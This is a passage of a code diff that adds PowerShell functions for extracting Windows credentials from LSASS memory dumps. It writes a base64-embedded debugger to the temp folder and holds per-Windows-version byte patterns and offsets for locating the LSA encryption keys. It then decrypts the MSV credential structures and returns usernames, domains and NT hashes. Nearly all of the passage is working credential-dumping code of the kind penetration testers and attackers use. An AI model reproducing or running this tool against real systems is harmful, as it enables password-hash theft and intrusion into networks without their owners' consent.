+        $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+        $BytesAdded = $BytesAdded + 4
+        $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+        $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+        $PrimaryCredentials_ptr = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+        $BytesAdded = $BytesAdded + 8
+        $PrimaryCredentials_data = Parse-KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC -InitialPosition (Get-Pattern -Address $PrimaryCredentials_ptr -CdbProgramPath $PathToCDP -DMPPath $PathToDMP) -StartAddress $PrimaryCredentials_ptr -DESKey $DESKey -IV $IV -PathToCDP $PathToCDP -PathToDMP $PathToDMP
+        
+
+    $KIWI_MSV1_0_CREDENTIAL_LIST = New-Object -Type psobject -Property (@{
+            "flink" = $flink
+            "AuthenticationPackageId"=$AuthenticationPackageId
+            "PrimaryCredentials_ptr"= $PrimaryCredentials_ptr
+            "PrimaryCredentials_data" = $PrimaryCredentials_data
+            })
+
+    return $KIWI_MSV1_0_CREDENTIAL_LIST
+    }
+
+    function Parse-KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
+    {
+    Param(
+    $InitialPosition,
+    $StartAddress,
+    $DESKey,
+    $IV,
+    $PathToCDP,
+    $PathToDMP
+    )
+
+    $KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC = New-Object -Type psobject -Property (@{
+            "flink" = $null
+            "Primary" = $null
+            "encrypted_credentials" = $null
+            "decrypted_credentials" = $null
+            })
+
+
+    $Primary = New-Object -Type psobject -Property (@{
+             "Position" = $Null
+             "Length" =  $null # 2 Bytes
+             "MaxLength" = $null # 2 Bytes
+             "Buffer" = $null # 8 Bytes
+             })
+
+    $encrypted_credentials = New-Object -Type psobject -Property (@{
+             "Position" = $Null
+             "Length" =  $null # 2 Bytes
+             "MaxLength" = $null # 2 Bytes
+             "Buffer" = $null # 8 Bytes
+             "data" = $null
+             })
+
+    $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+    $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+
+    $fileReader.BaseStream.Position=$InitialPosition
+    $flink = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $Primary.Position = $InitialPosition
+    $Primary.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $Primary.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $Primary.Buffer =  Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') # TODO Soll noch char werden
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+    
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+    
+    $encrypted_credentials.Position = $InitialPosition
+    $encrypted_credentials.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+    $encrypted_credentials.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+    
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $encrypted_credentials.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') # TODO Soll noch char werden
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+    $encrypted_credentials.data = ([System.BitConverter]::ToString($fileReader.ReadBytes([convert]::toint64($encrypted_credentials.Length,16)))).replace('-','') # TODO Soll noch char werden
+    # ACHTUNG beim Einlesen der daten beachten - der PUFFER ist in PyPyKatz die Position - bei mir muss ich die Länge des Puffers zur Position hizufügen (wichtig der Puffer ist 8 Bytes)
+    [string]$DecryptedCredsStr = Get-DecCreds -DESKey $DESKey -IV $IV -EncString $encrypted_credentials.data 
+    $decrypted_credentials = Parse-Credentials -DecString $DecryptedCredsStr
+
+    $KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC = New-Object -Type psobject -Property (@{
+        "flink" = $flink
+        "Primary" = $Primary
+        "encrypted_credentials" = $encrypted_credentials
+        "decrypted_credentials" = $decrypted_credentials
+        })
+
+    return $KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
+    }   
+
+    function Parse-Credentials
+    {
+    Param(
+        [string]$DecString
+    )
+    $ParsedCreds = New-Object -Type psobject -Property (@{
+            "LogonDomainName" = $null
+		    "UserName" = $null
+		    "pNtlmCredIsoInProc" = $null
+		    "isIso" = $null
+		    "isNtOwfPassword" =$null
+		    "isLmOwfPassword" = $null
+		    "isShaOwPassword" =$null
+		    "isDPAPIProtected" =$null
+		    "align0" =$null
+		    "align1" = $null
+		    "align2" = $null
+		    "unkD" = $null
+		    "isoSize" =$null
+		    "DPAPIProtected" = $null
+		    "align3" = $null
+		    "NtOwfPassword" = $null
+		    "LmOwfPassword" = $null
+		    "ShaOwPassword" = $null
+             })
+
+
+    $LogonDomainName = New-Object -Type psobject -Property (@{
+             "Position" = $Null
+             "Length" =  $null # 2 Bytes
+             "MaxLength" = $null # 2 Bytes
+             "Buffer" = $null # 8 Bytes
+             "Data" = $null
+             })
+    $DecUsername = New-Object -Type psobject -Property (@{
+             "Position" = $Null
+             "Length" =  $null # 2 Bytes
+             "MaxLength" = $null # 2 Bytes
+             "Buffer" = $null # 8 Bytes
+             "Data" = $null
+             })
+
+        $Position = 0
+        $LogonDomainName.Position = $Position
+        $LogonDomainName.Length = Rev-LitEdian -InputStr ($DecString.Substring($Position,4))
+        $Position = $Position + 4 
+        $LogonDomainName.MaxLength = Rev-LitEdian -InputStr ($DecString.Substring($Position,4))
+        $Position = $Position + 4 
+        $Position = $Position + (2*(Get-Align -BaseAddress 000000000000 -BytestoAdd ($Position / 2)))
+        $LogonDomainName.Buffer = Rev-LitEdian -InputStr ($DecString.Substring($Position,16))
+        $Position = $Position + 16 
+        $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.Length,16)*2))))
+        $DecUsername.Position = $Position
+        $DecUsername.Length = Rev-LitEdian -InputStr ($DecString.Substring($Position,4))
+        $Position = $Position + 4 
+        $DecUsername.MaxLength = Rev-LitEdian -InputStr ($DecString.Substring($Position,4))
+        $Position = $Position + 4 
+        $Position = $Position + (2*(Get-Align -BaseAddress 000000000000 -BytestoAdd ($Position / 2)))
+        $DecUsername.Buffer = Rev-LitEdian -InputStr ($DecString.Substring($Position,16))
+        $Position = $Position + 16
+        $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.Length,16)*2))))
+		$pNtlmCredIsoInProc = $DecString.Substring($Position,16)  #PVOID(reader).value # 8 Byte
+        $Position = $Position + 16
+		$isIso =  $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$isNtOwfPassword = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$isLmOwfPassword = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$isShaOwPassword = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$isDPAPIProtected = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$align0 = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$align1 = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$align2 = $DecString.Substring($Position,2)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 2
+		$unkD = $DecString.Substring($Position,8)
+        $Position = $Position + 8 # DWORD(reader).value # // 1/2 - 4 Byte
+		# stuff to be done! #pragma pack(push, 2)
+		$isoSize = $DecString.Substring($Position,4)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 4
+		$DPAPIProtected = $DecString.Substring($Position,32)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 32
+		$align3 = $DecString.Substring($Position,8)
+        $Position = $Position + 8 #DWORD(reader).value #// 00000000 - 4 Byte
+		# stuff to be done! #pragma pack(pop)
+ 
+		$NtOwfPassword = $DecString.Substring($Position,32)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 32
+		$LmOwfPassword = $DecString.Substring($Position,32)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 32
+		$ShaOwPassword = $DecString.Substring($Position,32)  # BOOLEAN(reader).value # 1 Byte
+        $Position = $Position + 32
+
+    $ParsedCreds = New-Object -Type psobject -Property (@{
+            "LogonDomainName" = $LogonDomainName
+		    "UserName" = $DecUsername
+		    "pNtlmCredIsoInProc" = $pNtlmCredIsoInProc
+		    "isIso" = $isIso
+		    "isNtOwfPassword" =$isNtOwfPassword
+		    "isLmOwfPassword" = $isLmOwfPassword
+		    "isShaOwPassword" =$isShaOwPassword
+		    "isDPAPIProtected" =$isDPAPIProtected
+		    "align0" =$align0
+		    "align1" = $align1
+		    "align2" = $align2
+		    "unkD" = $unkD
+		    "isoSize" =$isoSize
+		    "DPAPIProtected" = $DPAPIProtected
+		    "align3" = $align3
+		    "NtOwfPassword" = $NtOwfPassword
+		    "LmOwfPassword" = $LmOwfPassword
+		    "ShaOwPassword" = $ShaOwPassword
+             })
+
+    return $ParsedCreds
+    }
+
+    function Prepare-Debugger
+    {
+    Param(
+        $Path,
+        $Verbose
+    )
+    
+    if($Path -eq $null)
+        {
+        $Path = $env:TEMP
+        }
+    
+    if($Verbose -eq $True)
+        {
+            Write-Host -Message ("[x] The debugger will be placed in " + $Path) -ForegroundColor green
+        }
+    $Base64String = "<CDB>"
+    $OutPutBytes = [System.Convert]::FromBase64String($Base64String);
+    $FilePath = $Path + "\cdb.exe"
+    try
+        {
+        [System.IO.File]::WriteAllBytes($FilePath, $OutPutBytes);
+        if($Verbose -eq $True)
+            {
+                Write-Host -Message ("[x] The debugger was written.") -ForegroundColor green
+            }
+        }
+    catch
+        {
+        if($Verbose -eq $True)
+            {
+                Write-Host -Message ("[-] The debugger could not be written.") -ForegroundColor red
+            }
+        exit
+        }
+    return $FilePath
+    }
+
+    function Clean-Debugger
+    {
+    Param(
+        $PathToDebugger
+        )
+
+    Remove-Item -Path $PathToDebugger
+    }
+
+    function Get-Systeminformation
+    {
+    Param(
+        $PathToDMP,
+        $PathToCDP
+    )
+    $RawSysinformation = Run-Debugger -PathToCDP $PathToCDP -PathToDMP $PathToDMP -Command ""
+
+    $SysInformation = $RawSysinformation -like "Windows*Version*"
+    $Version = $SysInformation[0].split(" ")[$SysInformation[0].split(" ").indexof("Version")+1]
+    $Architekture = $SysInformation[0].substring($SysInformation[0].Length-3,3)
+
+    $RawMSVTimestamp = Run-Debugger -PathToCDP $PathToCDP -PathToDMP $PathToDMP -Command "lm v"
+
+    $RawTimeStamp = (($RawMSVTimestamp |Select-string -Pattern "lsasrv" -Context 2).Context.DisplayPostContext | Select-String -Pattern "Timestamp").tostring().trim()
+    try
+        {
+        $MSVTimestamp=[Math]::Floor([decimal](Get-Date([datetime]::ParseExact($RawTimeStamp.Substring(11,($RawTimeStamp.Length-11)).trim().Substring(0,$RawTimeStamp.Substring(11,($RawTimeStamp.Length-11)).trim().IndexOf("(")).trim(),"ddd MMM  d HH:mm:ss yyyy",$null)).ToUniversalTime()-uformat "%s"))
+        }
+    catch
+        {
+        $MSVTimestamp = [convert]::toint64((($RawTimeStamp).tostring()).Split(":")[1].Split("(")[0].trim(),16)
+        }
+    return $Version, $Architekture, $MSVTimestamp
+    }
+
+    function Select-CryptoTemplate
+    {
+    Param(
+        [int]$OSVersion,
+        $OSArch
+    )
+
+    $WIN_XP  = 2600
+	$WIN_2K3 = 3790
+	$WIN_VISTA = 6000
+	$WIN_7 = 7600
+	$WIN_8 = 9200
+	$WIN_BLUE = 9600
+	$WIN_10_1507 = 10240
+	$WIN_10_1511 = 10586
+	$WIN_10_1607 = 14393
+	$WIN_10_1703 = 15063
+	$WIN_10_1709 = 16299
+	$WIN_10_1803 = 17134
+	$WIN_10_1809 = 17763
+	$WIN_10_1903 = 18362
+
+    $Pattern = $null
+	$IV_length = $null
+	$offset_to_IV_ptr = $null
+	$offset_to_DES_key_ptr = $null
+	$offset_to_AES_key_ptr = $null
+
+    if($OSVersion -le $WIN_XP)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_2K3)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_VISTA)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_7)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_8)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_BLUE)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_10_1507)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+        }
+    elseif($OSVersion -le $WIN_10_1511)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+        }
+    elseif($OSVersion -le $WIN_10_1607)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+        }
+    elseif($OSVersion -le $WIN_10_1703)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+        }
+    elseif($OSVersion -le $WIN_10_1709)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+        }
+    elseif($OSVersion -le $WIN_10_1803)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+
+        }
+    elseif($OSVersion -lt $WIN_10_1809)
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 61
+	    $offset_to_DES_key_ptr = -73
+	    $offset_to_AES_key_ptr = 16
+        }
+    else
+        {
+        $Pattern = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	    $IV_length = 16
+	    $offset_to_IV_ptr = 67
+	    $offset_to_DES_key_ptr = -89
+	    $offset_to_AES_key_ptr = 16
+
+        }
+
+    return $Pattern, $offset_to_IV_ptr, $offset_to_DES_key_ptr, $offset_to_AES_key_ptr
+    }
+
+    function Select-MSVTemplate
+    {
+    Param(
+        [int]$OSVersion,
+        $OSArch,
+        $LSATimestamp
+    )
+
+    $WIN_XP  = 2600
+	$WIN_2K3 = 3790
+	$WIN_VISTA = 6000
+	$WIN_7 = 7600
+	$WIN_8 = 9200
+	$WIN_BLUE = 9600
+	$WIN_10_1507 = 10240
+	$WIN_10_1511 = 10586
+	$WIN_10_1607 = 14393
+	$WIN_10_1703 = 15063
+	$WIN_10_1709 = 16299
+	$WIN_10_1803 = 17134
+	$WIN_10_1809 = 17763
+	$WIN_10_1903 = 18362
+
+    $Pattern = $null
+	$offset_to_FirstEntry = $null
+	$offset_to_SessionCounter = $null
+
+
+    if($OSVersion -le $WIN_XP)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_2K3)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_VISTA)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_7)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_8)
+        {
+
+        }
+    elseif($OSVersion -le $WIN_BLUE)
+        {
+            $Pattern = "8b de 48 8d 0c 5b 48 c1 e1 05 48 8d 05"
+            $offset_to_FirstEntry = 16
+            $offset_to_SessionCounter = -4
+            if($LSATimestamp -gt "139722752")
+                {
+                $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+                }
+            else 
+                {
+                $ParsingTemplate = "PKIWI_MSV1_0_LIST_62"
+                }
+        }
+    elseif($OSVersion -le $WIN_10_1507)
+        {
+        $Pattern = "33 ff 41 89 37 4c 8b f3 45 85 c0 74"
+	    $offset_to_FirstEntry = 16
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    elseif($OSVersion -le $WIN_10_1511)
+        {
+        $Pattern = "33 ff 41 89 37 4c 8b f3 45 85 c0 74"
+	    $offset_to_FirstEntry = 16
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    elseif($OSVersion -le $WIN_10_1607)
+        {
+        $Pattern = "33 ff 41 89 37 4c 8b f3 45 85 c0 74"
+	    $offset_to_FirstEntry = 16
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    elseif($OSVersion -le $WIN_10_1703)
+        {
+        $Pattern = "33 ff 45 89 37 48 8b f3 45 85 c9 74"
+	    $offset_to_FirstEntry = 23
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    elseif($OSVersion -le $WIN_10_1709)
+        {
+        $Pattern = "33 ff 45 89 37 48 8b f3 45 85 c9 74"
+	    $offset_to_FirstEntry = 23
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    elseif($OSVersion -le $WIN_10_1803)
+        {
+        $Pattern = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"
+	    $offset_to_FirstEntry = 23
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    elseif($OSVersion -le $WIN_10_1809)
+        {
+        $Pattern = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"
+	    $offset_to_FirstEntry = 23
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+    else
+        {
+        $Pattern = "33 ff 41 89 37 4c 8b f3 45 85 c0 74"
+	    $offset_to_FirstEntry = 23
+	    $offset_to_SessionCounter = -4
+        $ParsingTemplate = "PKIWI_MSV1_0_LIST_63"
+        }
+
+    return $Pattern, $offset_to_FirstEntry, $offset_to_SessionCounter, $ParsingTemplate
+    }
+
+    $PathToDebugger = Prepare-Debugger -verbose $Verbose
+
+    try {
+        Test-Path $PathToDMP | Out-Null
+    }
+    catch {
+        return "DMP File not found - Function terminated"
+        throw
+    }
+
+    if((Test-Path $PathToDebugger))
+        {
+        if($Verbose -eq $True)
+            {
+                Write-Host -Message ("[x] Dump and Debugger present") -ForegroundColor green
+            }
+        }
+    else 
+        {
+            Clean-Debugger -PathToDebugger $PathToDebugger
+            return "Debugger not found - Function terminated"
+        }    
+  
+    $SystemInformation = (Get-Systeminformation -PathToDMP $PathToDMP -PathToCDP $PathToDebugger)
+    $OSVersion = $SystemInformation[0]
+    $OSArch =  $SystemInformation[1]
+    $MSVTimestamp =  $SystemInformation[2]
+
+    if($Verbose -eq $True)
+    {
+        Write-Host -Message ("[x] Systeminformation extracted from Dump") -ForegroundColor green
+        Write-Host -Message ("    [x] OS Version: " + $OSVersion) -ForegroundColor green
+        Write-Host -Message ("    [x] OS Architecture: " + $OSArch) -ForegroundColor green
+    }
+
+    $CryptoTemplate = Select-CryptoTemplate -OSVersion $OSVersion -OSArch $OSArch
+    $CryptoKeyPattern = $CryptoTemplate[0]
+    $Cryptooffset = $CryptoTemplate[1]
+    $CryptoDESoffset = $CryptoTemplate[2]
+    $CryptoAESOffset = $CryptoTemplate[3]
+
+    if($CryptoTemplate[0] -eq $null)
+        {
+            return "No crypto template found - OS is currently not supported :( "
+        }
+
+    if($Verbose -eq $True)
+    {
+        Write-Host -Message ("[x] Cryptotemplate selected - based on extracted OS Information") -ForegroundColor green
+        Write-Host -Message ("    [x] Key Pattern: " + $CryptoKeyPattern) -ForegroundColor green
+        Write-Host -Message ("    [x] IV Offset: " + $Cryptooffset) -ForegroundColor green
+        Write-Host -Message ("    [x] DES Offset: " + $CryptoDESoffset) -ForegroundColor green
+        Write-Host -Message ("    [x] AES Offset: " + $CryptoAESOffset) -ForegroundColor green
+    }
+
+    $MSVTemplate = Select-MSVTemplate  -OSVersion $OSVersion -OSArch $OSArch -LSATimestamp $MSVTimestamp
+    $CredentialPattern = $MSVTemplate[0]
+    $MSVOffsetFirstEntry = $MSVTemplate[1]
+    $MSVOffset =  $MSVTemplate[2]
+    $MSVParser = $MSVTemplate[3]
+    if($Verbose -eq $True)
+    {
+        Write-Host -Message ("[x] MSV template selected - based on extracted OS Information") -ForegroundColor green
+        Write-Host -Message ("    [x] Credential Pattern: " + $CredentialPattern) -ForegroundColor green
+        Write-Host -Message ("    [x] First Entry Offset: " + $MSVOffsetFirstEntry) -ForegroundColor green
+    }
+
+    $CryptoKeys = Get-Crypto -keypattern $Cryptokeypattern -offset $Cryptooffset -AESOffset $CryptoAESOffset -DESoffset $CryptoDESoffset -PathToDebugger $PathToDebugger -PathToDMP $PathToDMP
+    $ModuleLSASVRStart = $CryptoKeys[3]
+
+    if($Verbose -eq $True)
+    {
+        Write-Host -Message ("[x] Cryptokeys extracted") -ForegroundColor green
+        Write-Host -Message ("    [x] IV: " + $CryptoKeys[0]) -ForegroundColor green
+        Write-Host -Message ("    [x] DES: " + $CryptoKeys[1]) -ForegroundColor green
+        Write-Host -Message ("    [x] AES: " + $CryptoKeys[2]) -ForegroundColor green
+        Write-Host -Message ("    [x] Start of LSA Modul within MemoryDump: " + $CryptoKeys[3]) -ForegroundColor green
+    }
+    ## Suche der Credentialliste
+
+    $CredEntriesAddresses = Get-CredEntries -CredentialPattern $CredentialPattern -ModuleLSASVRStart $ModuleLSASVRStart -MSVOffset $MSVOffset -MSVOffsetFirstEntry $MSVOffsetFirstEntry -PathToDebugger $PathToDebugger -PathToDMP $PathToDMP
+    $CredEntriesAddresses = ($CredEntriesAddresses | where {$_.length -gt 1})
+    $CredentialList = @()
+
+    if($Verbose -eq $True)
+    {
+        Write-Host -Message ("[x] Credentiallist entries aquired - in summary " + $CredEntriesAddresses.count + " Entries have been identified") -ForegroundColor green
+    }
+
+    foreach($CredEntry in $CredEntriesAddresses)
+        {    
+        $AddressArray = @()       
+        $newrun = $true
+        do
+            {
+                if($newrun -eq $true)
+                    {
+                    $Flink = $CredEntry
+                    $newrun = $false
+                    }
+                else
+                    {
+                    $Flink = $CredentialEntry.flink
+                    }
+                $CredEntryAddressInitialPosition = Get-Pattern -Address  $flink -CdbProgramPath $PathToDebugger -DMPPath $PathToDMP
+                $CredentialEntry = $null
+                if($MSVParser -eq "PKIWI_MSV1_0_LIST_62")
+                    {
+                         
+                        $CredentialEntry = Parse-KIWI_MSV1_0_LIST_62 -InitialPosition $CredEntryAddressInitialPosition -StartAddress $flink -DESKey $CryptoKeys[1] -IV $CryptoKeys[0] -PathToCDP  $PathToDebugger  -PathToDMP $PathToDMP
+                    }
+                else 
+                    {
+                        $CredentialEntry = Parse-KIWI_MSV1_0_LIST_63 -InitialPosition $CredEntryAddressInitialPosition -StartAddress $flink -DESKey $CryptoKeys[1] -IV $CryptoKeys[0] -PathToCDP  $PathToDebugger  -PathToDMP $PathToDMP
+                    }
+            
+                if($AddressArray.FLINK -notcontains $CredentialEntry.flink -and $CredentialEntry.flink -ne "0000000000000000")
+                    {
+
+                    $AddressArray += New-Object -Type psobject -Property (@{
+                      "FLINK" = $CredentialEntry.flink
+                      "Counter" =  1
+                       })
+                    }
+                elseif($AddressArray.FLINK -contains $Flink)
+                    {
+                    break
+                    }
+                $CredentialList += $CredentialEntry
+                $Flink = $null
+            }
+        while(@($AddressArray | where Counter -ne 2).Count -gt 0)
+        }
+    
+    $Result = @()
+    $Result += New-Object -Type psobject -Property (@{
+        "Username" = $null
+        "LogonDomain" =  $null
+        "NTHash" = $null
+        })
+
+    Foreach($Entry in $CredentialList)
+        {
+            if($Result.username -notcontains $Entry.PKIWI_MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_credentials.Username.data -and $Result.domain -notcontains $Entry.PKIWI_MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_credentials.LogonDomainName.data -and $Result.NTHash -notcontains $Entry.PKIWI_MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_credentials.NtOwfPassword)
+                {
+                    $Result += New-Object -Type psobject -Property (@{
+                        "Username" = $Entry.PKIWI_MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_credentials.Username.data
+                        "LogonDomain" =  $Entry.PKIWI_MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_credentials.LogonDomainName.data
+                        "NTHash" = $Entry.PKIWI_MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_credentials.NtOwfPassword
+                        }) 
+                }
+        }
+
+    if($Verbose -eq $True)
+        {
+        Write-Host -Message ("[x] Debugger has been deleted") -ForegroundColor green
+        Write-Host -Message ("[x] Run completed") -ForegroundColor green
+        }
+            
+    Clean-Debugger -PathToDebugger $PathToDebugger
+    return $Result
+}
+
